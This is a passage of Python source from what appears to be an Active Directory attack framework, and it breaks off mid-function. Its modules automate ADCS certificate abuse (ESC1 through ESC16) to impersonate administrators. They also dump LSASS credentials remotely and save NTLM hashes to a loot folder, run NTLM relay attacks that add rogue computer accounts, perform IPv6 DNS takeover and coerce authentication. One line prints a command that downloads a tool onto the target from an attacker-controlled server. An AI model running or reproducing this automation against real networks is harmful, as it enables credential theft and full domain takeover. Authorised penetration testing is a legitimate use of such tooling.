            if dacledit2:
                run_cmd([dacledit2,'-action','write','-rights','FullControl',
                         '-principal',user,'-target',obj,auth_full,'-dc-ip',target.dc],
                        label='dacledit grant FullControl')
            else:
                run_cmd(base+['add','genericAll',_resolve(obj),_resolve(user)], label='bloodyAD genericAll')
        hr()

# =============================================================================
# EXPLOITATION
# =============================================================================

# =============================================================================
# ADCSKILLER — automated ADCS ESC chain exploitation
# =============================================================================
class ADCSKiller(Module):
    name='adcskiller'; description='ADCSKiller — automated ADCS ESC1-8 enumeration and exploitation chain'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        t = self.need('ADCSKiller','ADCSKiller.py')
        if not t: return
        hr()
        log(f'{C0}ADCSKiller — automated ADCS attack chain{RESET}','info')
        action = self.ask('action','auto',['auto','find','exploit'])
        auth = f'{target.domain}/{target.user}'
        if target.password: auth += f':{target.password}'
        hr()
        if action == 'auto':
            log('Auto mode — find and exploit vulnerable templates','info')
            run_cmd(['python3',t,'-u',auth,'-dc-ip',target.dc,'-auto'],
                    label='ADCSKiller auto')
        elif action == 'find':
            run_cmd(['python3',t,'-u',auth,'-dc-ip',target.dc],
                    label='ADCSKiller find')
        elif action == 'exploit':
            esc = self.ask('ESC number','1')
            run_cmd(['python3',t,'-u',auth,'-dc-ip',target.dc,f'-esc{esc}'],
                    label=f'ADCSKiller ESC{esc}')
        hr()


# =============================================================================
# GROUPER2 — GPO misconfiguration finder
# =============================================================================
class Grouper2(Module):
    name='grouper2'; description='Grouper2 — enumerate GPO misconfigurations, find privesc paths via Group Policy'; category='recon'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'{C0}Grouper2 — GPO misconfiguration analysis{RESET}','info')
        log(f'{GREY}Finds weak GPO permissions, password in GPOs, script paths, etc.{RESET}','info')

        # Grouper2 is a .NET tool — run via exec or upload
        t = check_tool('Grouper2','Grouper2.exe')
        if not t:
            log(f'Grouper2.exe not found in win tools — checking local','warn')
            t = os.path.join(os.path.expanduser('~/.segfault-ad/tools/win'),'Grouper2.exe')
            if not os.path.exists(t):
                log(f'Download from: https://github.com/l0ss/Grouper2/releases','error')
                log(f'Place at: {WHITE}{t}{RESET}','info')
                hr(); return

        # needs to run on Windows via exec shell — generate command
        log(f'Run on target Windows host via exec shell:','info')
        print(f'  {C0}Invoke-WebRequest -Uri https://your-server/Grouper2.exe -OutFile C:\\Temp\\Grouper2.exe{RESET}')
        print(f'  {C0}C:\\Temp\\Grouper2.exe -f C:\\Temp\\grouper2_out.json{RESET}')
        print(f'  {C0}# or: Grouper2.exe -u (full output) -l 3 (verbosity){RESET}')
        print()

        # alternative: use netexec to run it remotely
        nxc = check_tool('netexec','nxc')
        if nxc and target.user and target.password:
            ans = self.ask('run via netexec smb exec','y',['y','n'])
            if ans == 'y':
                out = os.path.join(target.loot_dir,'grouper2.txt')
                run_cmd([nxc,'smb',target.dc,
                         '-u',target.user,'-p',target.password,
                         '-M','grouper2'],
                        label='nxc grouper2 module')
        hr()


# =============================================================================
# ACLIGHT — shadow admin / privileged account discovery
# =============================================================================
class ACLight(Module):
    name='aclight'; description='ACLight — discover shadow admins and privileged accounts beyond default DA/EA via ACL analysis'; category='recon'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'{C0}ACLight — privileged account discovery{RESET}','info')
        log(f'{GREY}Finds shadow admins — accounts with admin-equivalent rights not in DA/EA{RESET}','info')

        t = check_tool('ACLight2.ps1','ACLight')
        if not t:
            win_dir = os.path.expanduser('~/.segfault-ad/tools/win')
            t = os.path.join(win_dir,'ACLight2.ps1')
            if not os.path.exists(t):
                log(f'Download from: https://github.com/cyberark/ACLight','error')
                log(f'Place ACLight2.ps1 at: {WHITE}{t}{RESET}','info')

        # run via netexec or generate PS command
        nxc = check_tool('netexec','nxc')
        if nxc and target.user and (target.password or target.hash):
            auth = ['-u',target.user]
            if target.hash:     auth += ['-H',target.hash]
            else:               auth += ['-p',target.password]
            out = os.path.join(target.loot_dir,'aclight.txt')
            log('Running ACLight via netexec...','info')
            run_cmd([nxc,'smb',target.dc]+auth+[
                '--exec-method','smbexec',
                '-X','Import-Module ACLight2.ps1; Start-ACLsAnalysis'],
                label='ACLight shadow admin scan')
        else:
            log('Run manually on Windows host:','info')
            print(f'  {C0}Import-Module ACLight2.ps1{RESET}')
            print(f'  {C0}Start-ACLsAnalysis{RESET}')
            print(f'  {C0}# Results saved to PrivilegedAccountsResults.txt{RESET}')

        # also use netexec LDAP to find accounts with adminCount=1 that aren't in admin groups
        log('Checking adminCount=1 accounts via LDAP...','info')
        if nxc and target.dc and target.user:
            auth2 = ['-u',target.user]
            if target.password: auth2 += ['-p',target.password]
            elif target.hash:   auth2 += ['-H',target.hash]
            rc, out_lines = run_cmd_capture(
                [nxc,'ldap',target.dc]+auth2+[
                    '--query','(&(adminCount=1)(objectClass=user))','name sAMAccountName memberOf'],
                label='ldap adminCount=1')
            out_data = '\n'.join(out_lines) if out_lines else ''
            if out_data:
                out_file = os.path.join(target.loot_dir,'shadow_admins.txt')
                with open(out_file,'w') as f: f.write(out_data)
                log(f'Saved → {WHITE}{out_file}{RESET}','info')
                add_result('aclight','shadow admin scan complete')
        hr()


# =============================================================================
# LSASSY — remote LSASS dump without mimikatz
# =============================================================================
class Lsassy(Module):
    name='lsassy'; description='lsassy — remote LSASS dump and credential extraction without dropping mimikatz'; category='credentials'
    def run(self, target):
        if not self.req(target): return
        t = self.need('lsassy')
        if not t: return
        hr()
        log(f'{C0}lsassy — remote LSASS credential extraction{RESET}','info')

        host = self.ask('target host',target.dc or '')
        if not host: hr(); return

        method = self.ask('dump method','comsvcs',
            ['comsvcs','procdump','dumpert','mirrordump','rdrleakdiag','silentprocessexit'])

        out = os.path.join(target.loot_dir,'lsassy.txt')
        auth_args = ['-d',target.domain,'-u',target.user]
        if target.hash:     auth_args += ['-H',target.hash]
        elif target.password: auth_args += ['-p',target.password]

        cmd = [t] + auth_args + ['-m',method,host]
        rc, out_lines = run_cmd_capture(cmd, label=f'lsassy {method}')
        out_data = '\n'.join(out_lines) if out_lines else ''

        if out_data:
            print(out_data)
            # parse creds
            import re as _re
            creds = _re.findall(r'(\S+):(\S+):([a-f0-9]{32})', out_data)
            if creds:
                log(f'{GREEN}{len(creds)} credential(s) extracted{RESET}','success')
                with open(out,'w') as f:
                    for domain, user, ntlm in creds:
                        f.write(f'{domain}\\{user}:{ntlm}\n')
                        log(f'  {GREEN}{domain}\\{user}{RESET} → {WHITE}{ntlm}{RESET}','success')
                        _db_save_cred(os.path.basename(target.loot_dir),
                                      target.domain, user, None, hash=ntlm, source='lsassy')
                add_result('lsassy', f'{len(creds)} creds extracted')
                log(f'Saved → {WHITE}{out}{RESET}','info')
            else:
                log('No credentials parsed from output','warn')
        hr()


class Certipy(Module):
    name='certipy'; description='certipy -- ADCS ESC1-16 exploitation + find/auth/shadow/relay'; category='exploitation'

    # ESC reference: conditions and certipy action
    ESC_INFO = {
        'ESC1':  ('ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU',                       'req -upn'),
        'ESC2':  ('Any Purpose EKU — use with ESC6/9/10 for full abuse',               'req (as self)'),
        'ESC3':  ('Enrollment Agent template — on-behalf-of requests',                 'req -on-behalf-of'),
        'ESC4':  ('WriteProperty on template — modify to ESC1, exploit, restore',      'template + req'),
        'ESC6':  ('EDITF_ATTRIBUTESUBJECTALTNAME2 on CA — any template exploitable',   'req -upn (any tpl)'),
        'ESC7':  ('ManageCA / ManageCertificates — approve pending, enable flags',     'ca -enable-template'),
        'ESC8':  ('NTLM relay to HTTP enrollment endpoint',                            'relay'),
        'ESC9':  ('NO_SECURITY_EXTENSION — certs survive password changes (persist)',  'req (persist)'),
        'ESC11': ('IF_ENFORCEENCRYPTICERTREQUEST cleared — RPC relay to ICERTREQ',     'relay (RPC)'),
        'ESC13': ('Issuance policy OID linked to AD group — gain group membership',    'req (group link)'),
        'ESC15': ('CVE-2024-49019 — version 1 template application policy override',   'req --application-policies'),
        'ESC16': ('CA omits szOID_NTDS_CA_SECURITY_EXT — all certs lack SID binding', 'req -upn (any tpl)'),
    }

    def run(self, target):
        if not self.req(target): return
        t = self.need('certipy','certipy-ad')
        if not t: return
        hr()
        action = self.ask('action','find',[
            'find','esc1','esc2','esc3','esc4','esc6','esc7','esc8',
            'esc9','esc11','esc13','esc15','esc16',
            'auth','shadow','ca','template','account','forge'
        ])
        hr()

        ba = ['-u',f'{target.user}@{target.domain}','-dc-ip',target.dc]
        # prefer Kerberos if ccache available (needed when NTLM is blocked)
        _cc = os.environ.get('KRB5CCNAME','')
        _loot_cc = os.path.join(target.loot_dir, f'{target.user}.ccache')
        if not _cc and os.path.exists(_loot_cc):
            _cc = _loot_cc; os.environ['KRB5CCNAME'] = _cc
        if _cc and os.path.exists(_cc):
            ba += ['-k','-no-pass']
            dc_host = target.dc_fqdn or f'dc01.{target.domain}'
            ba += ['-dc-host', dc_host]
        elif target.password: ba += ['-p',target.password]
        elif target.hash:   ba += ['-hashes',f':{target.hash}']

        def _req_base():
            ca  = self.ask('CA name (e.g. DC-CA)')
            tpl = self.ask('template','User')
            return ca, tpl

        if action == 'find':
            _, lines = run_cmd_capture([t,'find']+ba+['-vulnerable','-stdout','-text'], label='certipy find')
            # parse and print compact summary
            import re as _re
            vulns = []; cas = []; tpls = []
            cur_tpl = None; cur_ca = None
            for l in lines:
                ls = l.strip()
                if ls.startswith('CA Name'):
                    cur_ca = ls.split(':',1)[-1].strip()
                    cas.append(cur_ca)
                if ls.startswith('Template Name'):
                    cur_tpl = ls.split(':',1)[-1].strip()
                m = _re.search(r'\[!\]\s*Vulnerabilities', ls)
                if m and cur_tpl:
                    pass
                m2 = _re.match(r'(ESC\d+)\s*:', ls)
                if m2 and cur_tpl:
                    vulns.append((cur_tpl, m2.group(1), ls.split(':',1)[-1].strip()))
            if vulns:
                hr()
                log(f'{RED}VULNERABLE TEMPLATES FOUND{RESET}','warn')
                for tpl_name, esc, desc in vulns:
                    print(f'  {RED}[!]{RESET} {WHITE}{tpl_name}{RESET}  {ORANGE}{esc}{RESET}  {GREY}{desc[:80]}{RESET}')
                    print(f'      {C0}→ run certipy  {esc.lower()}{RESET}  {GREY}template={tpl_name}  ca={cas[0] if cas else "?"}{RESET}')
                # add first vuln to attack map with short label
                first_esc, first_tpl = vulns[0][1], vulns[0][0]
                add_result('certipy', f'{first_esc} — {first_tpl}')
            else:
                log('No vulnerable templates found','info')
                log(f'If you expect ESC9: pivot to {C0}ca_operator{RESET} first — templates are permission-filtered','warn')
                log(f'  → {GREY}bloody resetpwd ca_operator  →  pivot  →  tgt  →  certipy find{RESET}','info')

        elif action == 'esc1':
            desc, _ = self.ESC_INFO['ESC1']
            log(f'ESC1: {GREY}{desc}{RESET}','info'); add_result('certipy', 'ESC1 exploited')
            ca, tpl = _req_base()
            upn = self.ask('target UPN',f'administrator@{target.domain}')
            sid = self.ask('target SID (optional — improves accuracy)','')
            cmd = [t,'req']+ba+['-template',tpl,'-ca',ca,'-upn',upn]
            if sid: cmd += ['-sid',sid]
            run_cmd(cmd, label='certipy req ESC1')
            log(f'Then: {C0}certipy auth -pfx {upn.split("@")[0]}.pfx -dc-ip {target.dc}{RESET}','info')

        elif action == 'esc2':
            desc, _ = self.ESC_INFO['ESC2']
            log(f'ESC2: {GREY}{desc}{RESET}','info'); add_result('certipy', 'ESC2 exploited')
            log(f'{ORANGE}ESC2 alone does not allow impersonation — combine with ESC6/9/10{RESET}','warn')
            ca, tpl = _req_base()
            run_cmd([t,'req']+ba+['-template',tpl,'-ca',ca], label='certipy req ESC2')

        elif action == 'esc3':
            desc, _ = self.ESC_INFO['ESC3']
            log(f'ESC3: {GREY}{desc}{RESET}','info'); add_result('certipy', 'ESC3 exploited')
            ca, _ = _req_base()
            step = self.ask('step','1',['1','2'])
            if step == '1':
                log('Step 1 — request Enrollment Agent certificate','info')
                run_cmd([t,'req']+ba+['-template','EnrollmentAgent','-ca',ca], label='certipy req ESC3 step1')
            else:
                agent_pfx = self.ask('enrollment agent pfx')
                on_behalf = self.ask('on behalf of user',f'administrator@{target.domain}')
                tpl2      = self.ask('template to request','User')
                run_cmd([t,'req']+ba+['-template',tpl2,'-ca',ca,
                         '-on-behalf-of',on_behalf,'-pfx',agent_pfx],
                        label='certipy req ESC3 step2')

        elif action == 'esc4':
            desc, _ = self.ESC_INFO['ESC4']
            log(f'ESC4: {GREY}{desc}{RESET}','info'); add_result('certipy', 'ESC4 exploited')
            tpl = self.ask('vulnerable template')
            step = self.ask('step','modify',['modify','exploit','restore'])
            if step == 'modify':
                log(f'{ORANGE}Modifying template to enable ENROLLEE_SUPPLIES_SUBJECT — restore after exploit!{RESET}','warn')
                run_cmd([t,'template']+ba+['-template',tpl,'-save-old'], label='certipy template ESC4 modify')
            elif step == 'exploit':
                ca = self.ask('CA name')
                upn = self.ask('target UPN',f'administrator@{target.domain}')
                run_cmd([t,'req']+ba+['-template',tpl,'-ca',ca,'-upn',upn], label='certipy req ESC4')
            elif step == 'restore':
                log('Restoring original template configuration...','info')
                run_cmd([t,'template']+ba+['-template',tpl], label='certipy template ESC4 restore')

        elif action == 'esc6':
            desc, _ = self.ESC_INFO['ESC6']
            log(f'ESC6: {GREY}{desc}{RESET}','info'); add_result('certipy', 'ESC6 exploited')
            log(f'{ORANGE}Requires KB5014754 not in full enforcement — check CA flag first{RESET}','warn')
            ca, tpl = _req_base()
            upn = self.ask('target UPN',f'administrator@{target.domain}')
            run_cmd([t,'req']+ba+['-template',tpl,'-ca',ca,'-upn',upn], label='certipy req ESC6')

        elif action == 'esc7':
            desc, _ = self.ESC_INFO['ESC7']
            log(f'ESC7: {GREY}{desc}{RESET}','info'); add_result('certipy', 'ESC7 exploited')
            ca   = self.ask('CA name')
            sub  = self.ask('action','enable-template',['enable-template','req','approve','retrieve'])
            if sub == 'enable-template':
                tpl = self.ask('template to enable (e.g. SubCA)','SubCA')
                # first grant ManageCertificates to current user via ManageCA
                # -dc-host required for RPC operations in certipy v5
                dc_host = target.dc_fqdn or f'dc01.{target.domain}'
                ca_extra = ['-dc-host', dc_host]
                log(f'Granting ManageCertificates to {WHITE}{target.user}{RESET} via ManageCA...','info')
                run_cmd([t,'ca']+ba+ca_extra+['-ca',ca,'-add-officer',target.user], label='certipy ca add-officer')
                run_cmd([t,'ca']+ba+ca_extra+['-ca',ca,'-enable-template',tpl], label='certipy ca ESC7 enable-template')
                log(f'Now request with: {C0}certipy esc7 req{RESET}','info')
            elif sub == 'req':
                # request cert using SubCA template with target UPN — will be denied but get request ID
                upn = self.ask('target UPN',f'administrator@{target.domain}')
                log(f'{ORANGE}Request will be denied — auto-answering y to save private key{RESET}','warn')
                dc_host = target.dc_fqdn or f'dc01.{target.domain}'
                ca_extra = ['-dc-host', dc_host]
                cmd_req = [t,'req']+ba+ca_extra+['-ca',ca,'-template','SubCA','-upn',upn]
                log(f'{GREY}{" ".join(cmd_req)}{RESET}','info'); hr()
                import subprocess as _sp5, re as _re9
                proc = subprocess.Popen(cmd_req, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                  stderr=subprocess.STDOUT, text=True)
                try:
                    out, _ = proc.communicate(input='y\n', timeout=30)
                except Exception as ex:
                    out = ''; log(f'Error: {ex}','error')
                for l in out.splitlines():
                    print(f'  {GREY}{l}{RESET}')
                lines = out.splitlines()
                req_id = None
                for l in lines:
                    m = re.search(r'Request ID[^0-9]*([0-9]+)', l)
                    if m: req_id = m.group(1); break
                if req_id:
                    log(f'Request ID: {WHITE}{req_id}{RESET} — now approve it','info')
                    log(f'Run: {C0}certipy esc7 → approve → {req_id}{RESET}','info')
                    # auto-approve if we have ManageCA
                    log(f'Auto-approving request {req_id}...','info')
                    run_cmd([t,'ca']+ba+ca_extra+['-ca',ca,'-issue-request',req_id], label='certipy ca approve')
                    # retrieve the cert
                    # save to loot dir — use simple filename, move after
                    pfx_name = f'{upn.split("@")[0]}.pfx'
                    key_file = f'{req_id}.key'
                    retrieve_cmd = [t,'req']+ba+ca_extra+['-ca',ca,'-retrieve',req_id]
                    if os.path.exists(key_file): retrieve_cmd += ['-pfx',key_file]
                    run_cmd(retrieve_cmd, label='certipy req retrieve')
                    # move pfx to loot dir
                    if os.path.exists(pfx_name):
                        pfx_out = os.path.join(target.loot_dir, pfx_name)
                        import shutil as _sh5; _sh5.move(pfx_name, pfx_out)
                        log(f'{GREEN}Cert saved: {WHITE}{pfx_out}{RESET}','success')
                        log(f'Now run: {C0}certipy auth{RESET}','info')
                else:
                    log(f'Could not auto-extract request ID — run approve manually','warn')
            elif sub == 'approve':
                req_id = self.ask('pending request ID')
                dc_host = target.dc_fqdn or f'dc01.{target.domain}'
                run_cmd([t,'ca']+ba+['-dc-host',dc_host,'-ca',ca,'-issue-request',req_id], label='certipy ca approve')
            elif sub == 'retrieve':
                req_id  = self.ask('request ID to retrieve')
                upn     = self.ask('UPN (for filename)',f'administrator@{target.domain}')
                key_file = self.ask('key file (blank = none)',f'{req_id}.key')
                pfx_out  = os.path.join(target.loot_dir, f'{upn.split("@")[0]}.pfx')
                dc_host  = target.dc_fqdn or f'dc01.{target.domain}'
                retrieve_cmd = [t,'req']+ba+['-dc-host',dc_host,'-ca',ca,'-retrieve',req_id,'-out',pfx_out]
                if key_file and os.path.exists(key_file): retrieve_cmd += ['-pfx',key_file]
                run_cmd(retrieve_cmd, label='certipy req retrieve')
            elif sub == 'backup':
                run_cmd([t,'ca']+ba+['-ca',ca,'-backup'], label='certipy ca backup')

        elif action == 'esc8':
            desc, _ = self.ESC_INFO['ESC8']
            log(f'ESC8: {GREY}{desc}{RESET}','info'); add_result('certipy', 'ESC8 exploited')
            ca      = self.ask('CA name')
            relay_t = self.ask('CA host for relay',target.dc_fqdn or target.dc)
            tpl     = self.ask('template','DomainController')
            log(f'Run in second terminal: {WHITE}impacket-ntlmrelayx -t http://{relay_t}/certsrv/certfnsh.asp -smb2support --adcs --template {tpl}{RESET}','info')
            log(f'Then coerce auth: {WHITE}coerce / printerbug / petitpotam{RESET}','info')
            run_cmd([t,'relay','-ca',ca,'-template',tpl], label='certipy relay ESC8')

        elif action == 'esc9':
            desc, _ = self.ESC_INFO['ESC9']
            log(f'ESC9: {GREY}{desc}{RESET}','info'); add_result('certipy', 'ESC9 exploited')
            log(f'{ORANGE}ESC9 flow: set UPN → req cert → restore UPN → auth{RESET}','warn')
            ca          = self.ask('CA name')
            tpl         = self.ask('template','CertifiedAuthentication')
            enroll_user = self.ask('enrollee account (requests cert)', target.user or '')
            impersonate = self.ask('impersonate', 'administrator')
            gw_user     = self.ask('GenericWrite target (whose UPN to set)', enroll_user)

            # UPN change must be done by the account WITH GenericWrite on gw_user
            # this is typically the PREVIOUS account (e.g. management_svc) not current
            log(f'{ORANGE}UPN modification requires GenericWrite on {gw_user}{RESET}','warn')
            gw_actor     = self.ask('account with GenericWrite on target (blank = current)', '')
            gw_actor_pwd = ''
            gw_actor_hash= ''
            if gw_actor:
                gw_actor_pwd  = self.ask(f'{gw_actor} password (blank if hash)','')
                gw_actor_hash = self.ask(f'{gw_actor} NT hash (blank if password)','')

            bloody = check_tool('bloodyad','bloodyAD')

            def _bloody_as(actor, pwd, hsh):
                b = [bloody,'--host',target.dc,'-d',target.domain,'-u',actor]
                if pwd:  b += ['-p',pwd]
                elif hsh: b += ['-p',f':{hsh}']
                return b

            if gw_actor and bloody:
                ba_upn = _bloody_as(gw_actor, gw_actor_pwd, gw_actor_hash)
            else:
                ba_upn = [bloody,'--host',target.dc,'-d',target.domain,'-u',target.user]
                if target.password: ba_upn += ['-p',target.password]
                elif target.hash:   ba_upn += ['-p',f':{target.hash}']

            # step 1: set UPN — use certipy account update (more reliable than bloodyAD for UPN)
            log(f'{C0}Step 1{RESET}: Setting {WHITE}{gw_user}{RESET} UPN → {WHITE}{impersonate}{RESET} (no domain suffix)','info')
            actor_u = gw_actor or target.user
            actor_p = gw_actor_pwd or target.password
            actor_h = gw_actor_hash or target.hash
            upn_cmd = [t,'account','update','-username',f'{actor_u}@{target.domain}',
                       '-dc-ip',target.dc,'-user',gw_user,'-upn',impersonate]
            # use actor creds NOT current target creds
            if actor_h:   upn_cmd += ['-hashes',f':{actor_h}']
            elif actor_p: upn_cmd += ['-p',actor_p]
            run_cmd(upn_cmd, label='certipy account update UPN')

            # step 2: request cert as enrollee
            log(f'{C0}Step 2{RESET}: Requesting cert as {WHITE}{enroll_user}{RESET}','info')
            req_ba = ['-u',f'{enroll_user}@{target.domain}','-dc-ip',target.dc]
            if target.hash:       req_ba += ['-hashes',f':{target.hash}']
            elif target.password: req_ba += ['-p',target.password]
            run_cmd([t,'req']+req_ba+['-template',tpl,'-ca',ca], label='certipy req ESC9')

            # step 3: restore UPN
            log(f'{C0}Step 3{RESET}: Restoring {WHITE}{gw_user}{RESET} UPN','info')
            restore_cmd = [t,'account','update','-username',f'{actor_u}@{target.domain}',
                           '-dc-ip',target.dc,'-user',gw_user,'-upn',f'{gw_user}@{target.domain}']
            # use actor creds NOT current target creds
            if actor_h:   restore_cmd += ['-hashes',f':{actor_h}']
            elif actor_p: restore_cmd += ['-p',actor_p]
            run_cmd(restore_cmd, label='certipy account restore UPN')

            # step 4: auth with cert
            pfx = f'{impersonate}.pfx'
            if os.path.exists(pfx):
                log(f'{C0}Step 4{RESET}: Authenticating with cert','info')
                run_cmd([t,'auth','-pfx',pfx,'-dc-ip',target.dc,
                         '-username',impersonate,'-domain',target.domain],
                        label='certipy auth ESC9')
                ccache = f'{impersonate}.ccache'
                if os.path.exists(ccache):
                    dest = os.path.join(target.loot_dir, ccache)
                    import shutil as _sh4; _sh4.move(ccache, dest)
                    os.environ['KRB5CCNAME'] = dest
                    log(f'{GREEN}ccache: {WHITE}{dest}{RESET}','success')
                    log(f'Now run: {WHITE}dcsync{RESET}','info')
            else:
                log(f'PFX not found — check certipy output above','error')
                log(f'Then run: {WHITE}certipy auth -pfx {impersonate}.pfx -dc-ip {target.dc}{RESET}','info')

        elif action == 'esc11':
            desc, _ = self.ESC_INFO['ESC11']
            log(f'ESC11: {GREY}{desc}{RESET}','info'); add_result('certipy', 'ESC11 exploited')
            log(f'{ORANGE}Requires IF_ENFORCEENCRYPTICERTREQUEST cleared on CA — check first{RESET}','warn')
            ca      = self.ask('CA name')
            relay_t = self.ask('CA host',target.dc_fqdn or target.dc)
            tpl     = self.ask('template','DomainController')
            log(f'ntlmrelayx: {WHITE}impacket-ntlmrelayx -t rpc://{relay_t} -rpc-mode ICEF --adcs-attack --adcs-template {tpl}{RESET}','info')
            run_cmd([t,'relay','-ca',ca,'-template',tpl], label='certipy relay ESC11')

        elif action == 'esc13':
            desc, _ = self.ESC_INFO['ESC13']
            log(f'ESC13: {GREY}{desc}{RESET}','info'); add_result('certipy', 'ESC13 exploited')
            log(f'{GREEN}Cert gives membership of linked group (e.g. Enterprise Admins){RESET}','info')
            ca, tpl = _req_base()
            run_cmd([t,'req']+ba+['-template',tpl,'-ca',ca], label='certipy req ESC13')
            log(f'After auth the TGT will contain the linked group — verify with klist / whoami /groups','info')

        elif action == 'esc15':
            desc, _ = self.ESC_INFO['ESC15']
            log(f'ESC15 (CVE-2024-49019): {GREY}{desc}{RESET}','info')
            ca, tpl = _req_base()
            step = self.ask('step','1',['1','2'])
            if step == '1':
                log('Step 1 — request cert with Certificate Request Agent application policy','info')
                run_cmd([t,'req']+ba+['-template',tpl,'-ca',ca,
                         '--application-policies','1.3.6.1.4.1.311.20.2.1'],
                        label='certipy req ESC15 step1')
            else:
                agent_pfx  = self.ask('step1 pfx file')
                on_behalf  = self.ask('on behalf of',f'administrator@{target.domain}')
                tpl2       = self.ask('template for step2','User')
                run_cmd([t,'req']+ba+['-template',tpl2,'-ca',ca,
                         '-on-behalf-of',on_behalf,'-pfx',agent_pfx],
                        label='certipy req ESC15 step2')

        elif action == 'esc16':
            desc, _ = self.ESC_INFO['ESC16']
            log(f'ESC16: {GREY}{desc}{RESET}','info')
            log(f'{RED}CA-wide — all certs affected regardless of template{RESET}','warn')
            ca, tpl = _req_base()
            upn = self.ask('target UPN',f'administrator@{target.domain}')
            run_cmd([t,'req']+ba+['-template',tpl,'-ca',ca,'-upn',upn], label='certipy req ESC16')

        elif action == 'auth':
            pfx = self.ask('pfx file')
            # extract username from pfx filename (e.g. administrator.pfx → administrator)
            upn_user = os.path.basename(pfx).replace('.pfx','').split('_')[0]
            username = self.ask('username', upn_user)
            domain   = self.ask('domain', target.domain)
            cmd_auth = [t,'auth','-pfx',pfx,'-dc-ip',target.dc,
                        '-username',username,'-domain',domain]
            run_cmd(cmd_auth, label='certipy auth')
            # save resulting ccache
            out_ccache = f'{username}.ccache'
            if os.path.exists(out_ccache):
                dest = os.path.join(target.loot_dir, out_ccache)
                import shutil as _sh3; _sh3.move(out_ccache, dest)
                os.environ['KRB5CCNAME'] = dest
                log(f'ccache saved: {WHITE}{dest}{RESET}','success')

        elif action == 'shadow':
            tu = self.ask('target user/computer')
            run_cmd([t,'shadow','auto']+ba+['-account',tu], label='certipy shadow')

        elif action == 'ca':
            subcmd = self.ask('subcommand','list',['list','backup','enable','disable'])
            cmd = [t,'ca']+ba
            if subcmd == 'list': cmd += ['-list']
            elif subcmd == 'backup': cmd += ['-backup']
            elif subcmd == 'enable': tpl2 = self.ask('template'); cmd += ['-enable-template',tpl2]
            elif subcmd == 'disable': tpl2 = self.ask('template'); cmd += ['-disable-template',tpl2]
            run_cmd(cmd, label=f'certipy ca {subcmd}')

        elif action == 'template':
            tpl2 = self.ask('template name'); subcmd = self.ask('action','info',['info','enable','write'])
            cmd = [t,'template']+ba+['-template',tpl2]
            if subcmd == 'write':
                log('Writing vulnerable config to template (ESC4)','warn')
                cmd += ['-save-old']
            run_cmd(cmd, label=f'certipy template {subcmd}')

        elif action == 'account':
            acct = self.ask('account'); subcmd = self.ask('action','create',['create','delete'])
            run_cmd([t,'account',subcmd]+ba+['-user',acct], label=f'certipy account {subcmd}')

        elif action == 'forge':
            log(f'ESC12 / CA key compromise — forge certificate as any user','info')
            ca_pfx = self.ask('CA pfx file (from certipy ca -backup)')
            upn    = self.ask('target UPN',f'administrator@{target.domain}')
            tpl_pfx = self.ask('template pfx (optional — fixes CRL issues)','')
            cmd = [t,'forge','-ca-pfx',ca_pfx,'-upn',upn]
            if tpl_pfx: cmd += ['-template',tpl_pfx]
            run_cmd(cmd, label='certipy forge')
            log(f'Then auth: {C0}certipy auth -pfx {upn.split("@")[0]}_forged.pfx -dc-ip {target.dc}{RESET}','info')

        hr()

class NTLMRelay(Module):
    name='relay'; description='impacket-ntlmrelayx -- relay to SMB/LDAP/ADCS/SOCKS, create computer, delegate'; category='exploitation'
    def run(self, target):
        t = self.need('impacket-ntlmrelayx','ntlmrelayx.py')
        if not t: return
        hr()
        mode   = self.ask('mode','smb',['smb','ldap','https-adcs','socks','dump','addcomputer'])
        t_host = self.ask('relay target',target.dc or '')
        bg     = self.ask('run in background terminal?','y',['y','n']) == 'y'
        hr()

        def _relay_run(cmd, label):
            if bg:
                ok = spawn_bg_terminal(cmd, title=f'relay:{mode}')
                if not ok:
                    log(f'{ORANGE}bg failed — running foreground{RESET}','warn')
                    run_cmd(cmd, label=label)
                else:
                    log(f'{GREEN}Relay running in background — now run coerce to trigger auth{RESET}','success')
                    log(f'  {C0}→ coerce  listener > YOUR_IP  target > {t_host}{RESET}','info')
            else:
                run_cmd(cmd, label=label)

        if mode == 'smb':
            _relay_run([t,'-t',f'smb://{t_host}','-smb2support','--no-http-server'], 'ntlmrelayx SMB')
        elif mode == 'ldap':
            _relay_run([t,'-t',f'ldaps://{t_host}','-smb2support','--no-http-server',
                     '--add-computer','EVILPC','--delegate-access'], 'ntlmrelayx LDAP RBCD')
        elif mode == 'https-adcs':
            ca  = self.ask('CA host',t_host)
            tpl = self.ask('template','DomainController')
            _relay_run([t,'-t',f'http://{ca}/certsrv/certfnsh.asp','-smb2support',
                     '--adcs','--template',tpl], 'ntlmrelayx ADCS ESC8')
        elif mode == 'socks':
            tf = self.ask('targets file')
            _relay_run([t,'-tf',tf,'-smb2support','--socks'], 'ntlmrelayx SOCKS')
        elif mode == 'dump':
            _relay_run([t,'-t',f'ldap://{t_host}','-smb2support','--no-http-server',
                     '-l',target.loot_dir], 'ntlmrelayx LDAP dump')
        elif mode == 'addcomputer':
            _relay_run([t,'-t',f'ldaps://{t_host}','-smb2support','--no-http-server',
                     '--add-computer','EVIL$','--no-acl'], 'ntlmrelayx add computer')
        hr()

class MITM6(Module):
    name='mitm6'; description='mitm6 -- IPv6 DNS takeover for NTLM relay, works with ntlmrelayx'; category='exploitation'
    def run(self, target):
        t = self.need('mitm6')
        if not t: return
        hr()
        iface  = self.ask('interface','eth0')
        domain = target.domain or self.ask('domain')
        relay  = check_tool('impacket-ntlmrelayx','ntlmrelayx.py')
        if relay and target.dc:
            log(f'Run in second terminal:', 'info')
            print(f'  {WHITE}{relay} -6 -t ldaps://{target.dc} -smb2support --add-computer EVILPC --delegate-access{RESET}')
        run_cmd([t,'-d',domain,'-i',iface], label='mitm6')
        hr()

class Coerce(Module):
    name='coerce'; description='auth coercion + auto-capture -- PetitPotam/Coercer/PrinterBug → Responder/relay'; category='exploitation'
    def run(self, target):
        if not target.dc: log('Set DC first','error'); return
        hr()
        action = self.ask('action','capture',['capture','relay','check'])
        hr()

        t_host   = self.ask('target DC/host', target.dc)
        listener = self.ask('your listener IP (tun0)')
        if not listener: log('Listener IP required','error'); hr(); return
        method   = self.ask('coerce method','all',['petitpotam','coercer','printerbug','dfscoerce','all'])
        hr()

        ua = ['-u',target.user,'-p',target.password or '','-d',target.domain or ''] if target.user else []

        def _coerce_all():
            def _try(names, extra, label):
